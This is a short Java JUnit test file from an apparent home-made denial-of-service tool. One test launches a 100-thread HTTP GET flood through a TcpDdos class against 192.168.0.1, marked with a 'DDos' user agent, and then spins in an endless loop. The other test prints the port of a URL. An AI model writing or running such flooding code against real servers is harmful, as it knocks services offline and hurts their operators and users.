package ljs.ddos;

import ljs.ddos.tcp.TcpDdos;
import ljs.ddos.tcp.http.HttpMethod;
import ljs.ddos.tcp.http.HttpRequestBuild;
import ljs.task.ThreadUtil;
import org.junit.Test;

import java.net.MalformedURLException;
import java.net.URL;

public class DDosTest {
    @Test
    public void tcpAttackTest() throws MalformedURLException, InterruptedException {
        TcpDdos tcpDdos = new TcpDdos(new HttpRequestBuild()
                .method(HttpMethod.GET)
                .url("http://192.168.0.1")
//                .addHead("Connection", "Keep-Alive")
//                .addHead("Accept-Encoding", "gzip")
                .addHead("User-Agent", "DDos")
                , 100).attack();
        for (; ; ) {
            int liveThread = tcpDdos.getLiveThread();
        }
    }

    @Test
    public void urlTest() throws MalformedURLException {
        int port = new URL("http://www.baidu.com").getPort();
        System.out.println(port);
    }
}
